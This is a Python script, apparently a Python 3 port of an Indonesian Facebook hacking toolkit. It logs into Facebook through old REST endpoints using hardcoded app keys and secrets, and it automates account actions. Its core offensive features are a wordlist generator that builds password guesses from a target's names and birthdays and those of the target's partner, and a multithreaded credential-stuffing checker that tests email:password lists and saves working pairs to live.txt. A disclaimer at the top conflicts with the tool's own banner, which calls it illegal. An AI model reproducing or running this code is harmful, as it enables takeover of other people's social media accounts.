#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author  : MR.K7C8NG
# Support : InDoNeSiA CYBER ErRoR SyStEm
# GitHub  : https://github.com/pashayogi
# Upgraded to Python 3
#
# WARNING: This tool is for educational/authorized use only.
# Unauthorized access to computer systems is illegal.
# Only use against accounts you own or have explicit permission to test.

import os
import sys
import time
import random
import hashlib
import getpass
import threading
import json

try:
    import requests
    from requests.exceptions import ConnectionError as RequestsConnectionError
except ImportError:
    print("pip3 install requests")
    sys.exit(1)

try:
    import mechanize
    from urllib.error import URLError
except ImportError:
    print("pip3 install mechanize")
    sys.exit(1)

from http import cookiejar
from concurrent.futures import ThreadPoolExecutor

# ---------------------------------------------------------------------------
# Globals
# ---------------------------------------------------------------------------
user_agent = "Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16"
max_time = 1
vulnot = "\033[31mNot Vuln"
vuln   = "\033[32mVuln"
login_file = "login.txt"
token_global = None
vuln_count  = 0
dead_count  = 0
check_count = 0
stop_event  = threading.Event()

# ---------------------------------------------------------------------------
# Colour helpers
# ---------------------------------------------------------------------------

def cetak(text):
    """Print text with ANSI colour cycling and flush."""
    colours = ["91", "92", "93", "94", "95", "96", "97"]
    out = text
    for c in colours:
        if "!" not in out:
            break
        out = out.replace("!", "\033[{};1m".format(c), 1)
    sys.stdout.write(out + "\033[0m")
    sys.stdout.flush()


def jalan2(z):
    """Animated character-by-character print."""
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


def tik():
    """Simple loading animation."""
    ticks = [".   ", "..  ", "... "]
    for o in ticks:
        print("\r\033[1;91m[●] \033[1;92mLoading \033[1;97m{}".format(o), end="")
        sys.stdout.flush()
        time.sleep(1)
    print()


# ---------------------------------------------------------------------------
# Banner
# ---------------------------------------------------------------------------

BANNER = """\033[1;92m
\u2554\u2566\u2557\u250c\u2500\u2510\u252c\u2500\u2510\u252c\u250c\u2500   \u2554\u2550\u2557\u2554\u2557\x20
\x20\u2551\u2551\u251c\u2500\u2524\u251c\u252c\u2518\u251c\u2534\u2510\u2500\u2500\u2500\u2560\u2563 \u2560\u2569\u2557
\u2550\u2569\u255d\u2534 \u2534\u2534\u2514\u2500\u2534 \u2534   \u255a  \u255a\u2550\u255d\x20\033[1;93mversi2
\033[1;93m* \033[1;97mAuthor  \033[1;91m: \033[1;96mMR.K7C8NG\033[1;97m
\033[1;93m* \033[1;97mSupport \033[1;91m: \033[1;96mInDoNeSiA CYBER ErRoR SyStEm\033[1;97m
\033[1;93m* \033[1;97mGitHub  \033[1;91m: \033[1;92m\033[4mhttps://github.com/pashayogi\033[0m
\033[1;97m[*] Upgraded to Python 3
"""


def logo():
    os.system("clear")
    print(BANNER)


# ---------------------------------------------------------------------------
# Exit helper
# ---------------------------------------------------------------------------

def keluar():
    print("\033[1;91m[!] Exit")
    sys.exit(0)


# ---------------------------------------------------------------------------
# Random string generator
# ---------------------------------------------------------------------------

def acak(x):
    chars = "mhkbpcP"
    w = ""
    for _ in range(x):
        i = random.randint(0, len(chars) - 1)
        w += chars[i]
    return w


# ---------------------------------------------------------------------------
# Facebook helpers
# ---------------------------------------------------------------------------

def _make_browser():
    br = mechanize.Browser()
    cj = cookiejar.LWPCookieJar()
    br.set_cookiejar(cj)
    br.set_handle_robots(False)
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor())
    br.addheaders = [("User-Agent", user_agent)]
    return br


def _fb_signature(params, secret):
    """Compute MD5 signature for the old Facebook REST API."""
    sorted_params = "".join("{}={}".format(k, v) for k, v in sorted(params.items()))
    return hashlib.md5((sorted_params + secret).encode()).hexdigest()


def fb_login_api(email, password):
    """
    Attempt login via the old Facebook mobile REST API.
    Returns the JSON response dict on success, None on failure.
    """
    app_secret = "62f8ce9f74b12f84c123cc23437a4a32"
    params = {
        "api_key": "882a8490361da98702bf97a021ddc14d",
        "credentials_type": "password",
        "email": email,
        "format": "JSON",
        "generate_machine_id": "1",
        "generate_session_cookies": "1",
        "locale": "en_US",
        "method": "auth.login",
        "password": password,
        "return_ssl_resources": "0",
        "v": "1.0",
    }
    params["sig"] = _fb_signature(params, app_secret)
    try:
        resp = requests.get(
            "https://api.facebook.com/restserver.php",
            params=params,
            headers={"User-Agent": user_agent},
            timeout=10,
        )
        data = resp.json()
        if "access_token" in data:
            return data
    except RequestsConnectionError:
        print("\033[1;91m[!] No connection")
    except Exception:
        pass
    return None


def fb_token_info(token):
    """Fetch basic profile info from Graph API using an access token."""
    try:
        resp = requests.get(
            "https://graph.facebook.com/me",
            params={"access_token": token},
            headers={"User-Agent": user_agent},
            timeout=10,
        )
        data = resp.json()
        if "id" in data:
            return data
    except RequestsConnectionError:
        print("\033[1;91m[!] No connection")
    except Exception:
        pass
    return None


def _save_token(token):
    with open(login_file, "w") as f:
        f.write(token)


def _load_token():
    if not os.path.exists(login_file):
        return None
    with open(login_file) as f:
        return f.read().strip() or None


# ---------------------------------------------------------------------------
# License / local credential gate
# ---------------------------------------------------------------------------

def lisensi():
    """Simple local login gate."""
    logo()
    print("Ini program ilegal,")
    print("Ceue tepod jangan pake program ini,")
    print("ntar tervully nangid :(")
    username = input("[*] Username : ")
    passwd   = getpass.getpass("[*] Password : ")
    if not username:
        print("\033[1;91m[!] Wrong goblok")
        keluar()
    # Default test credential: admin / admin
    if passwd != "admin":
        print("\033[1;91m[!] Wrong goblok")
        keluar()
    print("\033[1;91m[\033[1;96m\u2713\033[1;91m] \033[1;92mSuccessfully njing")
    with open(login_file, "w") as fh:
        fh.write("")


# ---------------------------------------------------------------------------
# Post-login features
# ---------------------------------------------------------------------------

def get_user_info(token):
    info = fb_token_info(token)
    if not info:
        print("\033[1;91m[!] No connection")
        return
    print("\033[1;91m[\033[1;96m\u2713\033[1;91m]\033[1;97m Name : \033[1;92m{}".format(info.get("name", "N/A")))
    print("\033[1;91m[\033[1;96m\u2713\033[1;91m]\033[1;97m ID   : \033[1;92m{}".format(info.get("id", "N/A")))


def get_friends(token):
    try:
        resp = requests.get(
            "https://graph.facebook.com/me/friends",
            params={"access_token": token},
            headers={"User-Agent": user_agent},
            timeout=10,
        )
        friends = resp.json().get("data", [])
        if not friends:
            print("\033[1;91m[!] No friends found")
            return
        for f in friends:
            print("\033[1;97m[ \033[1;92m{}\033[1;97m ] => id: {}".format(f.get("name"), f.get("id")))
    except RequestsConnectionError:
        print("\033[1;91m[!] No connection")


def accept_friends(token):
    """Accept all pending friend requests."""
    try:
        resp = requests.get(
            "https://graph.facebook.com/me/friends",
            params={"from": "requests", "access_token": token},
            headers={"User-Agent": user_agent},
            timeout=10,
        )
        data = resp.json().get("data", [])
        if not data:
            print("\033[1;91m[!] No friend requests")
            return
        print("\033[1;91m[\033[1;92mStart \033[1;97m...")
        for person in data:
            uid = person.get("id")
            r = requests.post(
                "https://graph.facebook.com/me/friends/{}".format(uid),
                params={"access_token": token},
                headers={"User-Agent": user_agent},
                timeout=10,
            )
            status = "\033[1;92mAccept" if r.status_code == 200 else "\033[1;91mFailed"
            print("\033[1;97m[ {}\033[1;97m ] {}".format(status, person.get("name")))
        print("\033[1;91m[+] \033[1;92mDone")
    except RequestsConnectionError:
        print("\033[1;91m[!] No connection")


def delete_friends(token):
    """Delete (unfriend) all friends."""
    try:
        resp = requests.get(
            "https://graph.facebook.com/me/friends",
            params={"access_token": token},
            headers={"User-Agent": user_agent},
            timeout=10,
        )
        friends = resp.json().get("data", [])
        if not friends:
            print("\033[1;91m[!] No friends")
            return
        print("\033[1;91m[\033[1;92mStart \033[1;97m... \033[1;97mStop \033[1;91mCTRL+C")
        for person in friends:
            if stop_event.is_set():
                print("\033[1;91m[!] Stopped")
                break
            uid = person.get("id")
            r = requests.delete(
                "https://graph.facebook.com/me/friends/{}".format(uid),
                params={"uid": uid, "access_token": token},
                headers={"User-Agent": user_agent},
                timeout=10,
            )
            status = "\033[1;92m Deleted " if r.status_code == 200 else "\033[1;91mFailed "
            print("\033[1;97m[{}\033[1;97m] {}".format(status, person.get("name")))
        print("\033[1;91m[+] \033[1;92mDone")
    except (RequestsConnectionError, KeyboardInterrupt):
        print("\033[1;91m[!] Stopped")


def create_post(token):
    status = input("\033[1;91m[+] \033[1;92mType status \033[1;91m:\033[1;97m ")
    if not status.strip():
        print("\033[1;91m[!] Don't be empty")
        return
    try:
        resp = requests.post(
            "https://graph.facebook.com/me/feed",
            params={"method": "POST", "message": status, "access_token": token},
            headers={"User-Agent": user_agent},
            timeout=10,
        )
        data = resp.json()
        print("\033[1;91m[+] \033[1;92mStatus ID \033[1;91m: \033[1;97m{}".format(data.get("id", "N/A")))
    except RequestsConnectionError:
        print("\033[1;91m[!] No connection")


def create_wordlist():
    """Generate a password wordlist from personal info of a target."""
    print("\033[1;91m[?] \033[1;92mFill in the complete data of the target below")
    first  = input("\033[1;91m[+] \033[1;92mNama Depan \033[1;97m: ")
    middle = input("\033[1;91m[+] \033[1;92mNama Tengah \033[1;97m: ")
    last   = input("\033[1;91m[+] \033[1;92mNama Belakang \033[1;97m: ")
    nick   = input("\033[1;91m[+] \033[1;92mNama Panggilan \033[1;97m: ")
    dob    = input("\033[1;91m[+] \033[1;92mTanggal Lahir >ex: |DDMMYY| \033[1;97m: ")
    print("\033[1;91m[?] \033[1;93mKalo Jomblo SKIP aja :v")
    gf     = input("\033[1;91m[+] \033[1;92mNama Pacar \033[1;97m: ")
    gfnick = input("\033[1;91m[+] \033[1;92mNama Panggilan Pacar \033[1;97m: ")
    gfdob  = input("\033[1;91m[+] \033[1;92mTanggal Lahir Pacar >ex: |DDMMYY| \033[1;97m: ")

    words = set()
    parts = [p for p in [first, middle, last, nick, dob, gf, gfnick, gfdob] if p]
    for i, a in enumerate(parts):
        words.add(a)
        for b in parts[i + 1:]:
            words.add(a + b)
            words.add(b + a)
            if dob:
                words.add(a + b + dob)
            if gfdob:
                words.add(a + b + gfdob)
    for p in parts:
        words.add(p + "123")
        words.add(p + "1234")
        words.add(p + "12345")
        if dob:
            words.add(p + dob)
        words.add(p.lower())
        words.add(p.upper())

    filename = "{}id.txt".format(first if first else "wordlist")
    with open(filename, "w") as fh:
        fh.write("\n".join(sorted(words)))
    print("\033[1;91m[+] \033[1;92mSaved \033[1;91m: \033[1;97m {}".format(filename))


def _check_single(line, sep):
    """Worker function for the account checker."""
    global vuln_count, dead_count, check_count
    parts = line.strip().split(sep)
    if len(parts) < 2:
        return
    email, password = parts[0], parts[1]
    try:
        resp = requests.get(
            "https://b-api.facebook.com/method/auth.login",
            params={
                "access_token": "237759909591655%7C0f140aabedfb65ac27a739ed1a2263b1",
                "format": "json",
                "sdk_version": "2",
                "email": email,
                "locale": "en_US",
                "password": password,
                "sdk": "ios",
                "generate_session_cookies": "1",
                "sig": "3f555f99fb61fcd7aa0c44f58f522ef6",
            },
            headers={"User-Agent": user_agent},
            timeout=10,
        )
        data = resp.json()
        if "access_token" in data:
            vuln_count += 1
            status = "\033[1;97m[ \033[1;92mLive\033[1;97m ] {}:{}".format(email, password)
            with open("live.txt", "a") as lf:
                lf.write("{}:{}\n".format(email, password))
        elif "error_code" in data and data["error_code"] == 406:
            check_count += 1
            status = "\033[1;97m[ \033[1;93mCheck\033[1;97m ] {}:{}".format(email, password)
        else:
            dead_count += 1
            status = "\033[1;97m[ \033[1;91mDie\033[1;97m ] {}:{}".format(email, password)
        print(status)
        print(
            "\033[1;91m[+] \033[1;92mTotal \033[1;91m: "
            "\033[1;97mLive=\033[1;92m{} "
            "\033[1;97mCheck=\033[1;93m{} "
            "\033[1;97mDie=\033[1;91m{}".format(vuln_count, check_count, dead_count)
        )
    except Exception:
        pass


def check_akun(token):
    """Account checker: read username|password pairs from a file."""
    global vuln_count, dead_count, check_count
    filepath = input("\033[1;91m[+] \033[1;92mFile path \033[1;91m:\033[1;97m ")
    if not os.path.exists(filepath):
        print("\033[1;91m[!] File not found")
        return
    sep = input("\033[1;91m[+] \033[1;92mSeparator \033[1;91m:\033[1;97m ")
    if not sep:
        sep = "|"
    vuln_count = dead_count = check_count = 0
    print("\033[1;91m[\033[1;92mStart \033[1;97m...")
    with open(filepath) as fh:
        lines = fh.readlines()
    try:
        with ThreadPoolExecutor(max_workers=10) as pool:
            for line in lines:
                pool.submit(_check_single, line, sep)
    except KeyboardInterrupt:
        print("\033[1;91m[!] Stopped")
    print("\033[1;91m[+] \033[1;92mDone")


def grupsaya(token):
    """List and save the user's Facebook groups."""
    os.makedirs("out", exist_ok=True)
    try:
        resp = requests.get(
            "https://graph.facebook.com/me/groups",
            params={"access_token": token},
            headers={"User-Agent": user_agent},
            timeout=10,
        )
        groups = resp.json().get("data", [])
        if not groups:
            print("\033[1;91m[!] Group not found")
            return
        with open("out/Grupid.txt", "w") as fh:
            for g in groups:
                line = "{} => {}".format(g.get("name"), g.get("id"))
                print("\033[1;97m[ \033[1;92mMyGroup\033[1;97m ] {}".format(line))
                fh.write(line + "\n")
        print("\033[1;91m[+] \033[1;92mTotal Group \033[1;91m: \033[1;97m {}".format(len(groups)))
        print("\033[1;91m[+] \033[1;92mSaved \033[1;91m: \033[1;97m out/Grupid.txt")
    except RequestsConnectionError:
        print("\033[1;91m[\033[1;97m] No Connection")
    except Exception as e:
        print("\033[1;91m[!] Error {}".format(e))


def guard(token):
    """Toggle Facebook profile guard."""
    logo()
    print("\033[1;97m\033[1;91m> \033[1;92m1.\033[1;97m Activate")
    print("\033[1;97m\033[1;91m> \033[1;92m2.\033[1;97m Not activate")
    print("\033[1;97m\033[1;91m> \033[1;91m0.\033[1;97m Back")
    pilih = input("\033[1;97m\033[1;91mD \033[1;97mR ")
    if pilih not in ("1", "2"):
        return
    enable = "true" if pilih == "1" else "false"
    try:
        uid_resp = requests.get(
            "https://graph.facebook.com/me",
            params={"access_token": token},
            headers={"User-Agent": user_agent},
            timeout=10,
        )
        uid = uid_resp.json().get("id", "")
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Authorization": "OAuth {}".format(token),
        }
        body = (
            'variables={{"0":{{"is_shielded":{},'
            '"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc",'
            '"actor_id":"{}",'
            '"client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}}}'
            "&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation"
            "&strip_defaults=true&strip_nulls=true&locale=en_US"
            "&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation"
            "&fb_api_caller_class=IsShieldedSetMutation"
        ).format(enable, uid)
        resp = requests.post(
            "https://graph.facebook.com/graphql",
            data=body,
            headers=headers,
            timeout=10,
        )
        if '"is_shielded":true' in resp.text:
            print("\033[1;91m[\033[1;96m\u2713\033[1;91m] \033[1;92mActivate")
        else:
            print("\033[1;91m[\033[1;96m\u2713\033[1;91m] \033[1;91mNot activate")
    except Exception as e:
        print("\033[1;91m[!] Error {}".format(e))


# ---------------------------------------------------------------------------
# Sub-menus
# ---------------------------------------------------------------------------

def pilih_lain(token):
    """'Other' submenu."""
    while True:
        logo()
        print("\033[1;97m\033[1;91m> \033[1;92m1.\033[1;97m Create Posts")
        print("\033[1;97m\033[1;91m> \033[1;92m2.\033[1;97m Create Wordlists")
        print("\033[1;97m\033[1;91m> \033[1;92m3.\033[1;97m Account Checkers")
        print("\033[1;97m\033[1;91m> \033[1;92m4.\033[1;97m See my group lists")
        print("\033[1;97m\033[1;91m> \033[1;92m5.\033[1;97m Profile Guards")
        print("\033[1;97m\033[1;91m> \033[1;91m0.\033[1;97m Back")
        pilih = input("\033[1;97m\033[1;91mD \033[1;97mR ")
        if pilih == "1":
            create_post(token)
        elif pilih == "2":
            create_wordlist()
        elif pilih == "3":
            check_akun(token)
        elif pilih == "4":
            grupsaya(token)
        elif pilih == "5":
            guard(token)
        elif pilih == "0":
            break
        else:
            print("\033[1;91m[!] Wrong input")
        input("\033[1;91m[ \033[1;97mBack \033[1;91m]")


def bgm(token):
    """Main post-login submenu."""
    while True:
        logo()
        get_user_info(token)
        print()
        print("\033[1;97m\033[1;91m> \033[1;92m1.\033[1;97m Informasi pengguna")
        print("\033[1;97m\033[1;91m> \033[1;92m2.\033[1;97m Dapatkan Id / email / hp")
        print("\033[1;97m\033[1;91m> \033[1;92m3.\033[1;97m Accept friend requests")
        print("\033[1;97m\033[1;91m> \033[1;92m4.\033[1;97m Delete friends")
        print("\033[1;97m\033[1;91m> \033[1;92m5.\033[1;97m Other")
        print("\033[1;97m\033[1;91m> \033[1;91m0.\033[1;97m Logout")
        pilih = input("\033[1;97m\033[1;91mD \033[1;97mR ")
        if pilih == "1":
            get_user_info(token)
        elif pilih == "2":
            get_friends(token)
        elif pilih == "3":
            accept_friends(token)
        elif pilih == "4":
            delete_friends(token)
        elif pilih == "5":
            pilih_lain(token)
        elif pilih == "0":
            if os.path.exists(login_file):
                os.remove(login_file)
            break
        else:
            print("\033[1;91m[!] Wrong input GOBLOK")
        input("\033[1;91m[ \033[1;97mBack \033[1;91m]")


# ---------------------------------------------------------------------------
# Login flows
# ---------------------------------------------------------------------------

def login():
    """Login via email + password using the Facebook mobile REST API."""
    logo()
    print("\033[1;91m[\033[1;92mLOGIN AKUN FACEBOOK \033[1;91m[+]")
    email  = input("\033[1;91m[+] \033[1;36mID\033[1;97m|\033[1;96mEmail\033[1;97m \033[1;91m:\033[1;92m ")
    passwd = getpass.getpass("\033[1;91m[+] \033[1;36mPassword \033[1;91m:\033[1;92m ")
    tik()
    result = fb_login_api(email, passwd)
    if result and "access_token" in result:
        token = result["access_token"]
        _save_token(token)
        print("\033[1;91m[\033[1;96m\u2713\033[1;91m] \033[1;92mLogin successfully")
        if result.get("checkpoints"):
            print("\033[1;91m[!] \033[1;93mAccount Checkpoints")
            if os.path.exists(login_file):
                os.remove(login_file)
            keluar()
        bgm(token)
    else:
        print("\033[1;91m[!] Login Failed")


def token_login():
    """Login using an existing access token."""
    global token_global
    logo()
    saved = _load_token()
    if saved:
        pick = input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
        if pick.lower() == "y":
            token_global = saved
    if not token_global:
        token_global = input("\033[1;91m[?] \033[1;92mToken\033[1;91m : \033[1;97m")
    if not token_global:
        print("\033[1;91m[!] Token not found")
        if os.path.exists(login_file):
            os.remove(login_file)
        return
    info = fb_token_info(token_global)
    if info and "id" in info:
        _save_token(token_global)
        nama = info.get("name", "")
        uid  = info.get("id", "")
        print("\033[1;91m[\033[1;96m\u2713\033[1;91m]\033[1;97m Name : \033[1;92m{}".format(nama))
        print("\033[1;91m[\033[1;96m\u2713\033[1;91m]\033[1;97m ID   : \033[1;92m{}".format(uid))
        if info.get("checkpoints"):
            print("\033[1;91m[!] \033[1;93mAccount Checkpoints")
            if os.path.exists(login_file):
                os.remove(login_file)
            keluar()
        bgm(token_global)
    else:
        print("\033[1;91m[!] Wrong")
        if os.path.exists(login_file):
            os.remove(login_file)


# ---------------------------------------------------------------------------
# Main menu
# ---------------------------------------------------------------------------

def menu():
    logo()
    print("             Decompile By MR.K7C8NG            \033[40m")
    print("\033[1;97m\u2551--\033[1;91m> \033[1;92m1.\033[1;97m masuk")
    print("\033[1;97m\u2551--\033[1;91m> \033[1;92m2.\033[1;97m Login menggunakan token")
    print("\033[1;97m\u2551--\033[1;91m> \033[1;91m0.\033[1;97m keluar")
    print("\033[1;97m\u2551")
    print("\033[1;97m\u255a\u2550\033[1;91mD \033[1;97mR")
    msuk = input()
    if msuk == "1":
        login()
    elif msuk == "2":
        token_login()
    elif msuk == "0":
        keluar()
    else:
        print("\033[1;91m[!] Wrong input GOBLOK!")
        menu()


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    try:
        while True:
            menu()
    except KeyboardInterrupt:
        keluar()
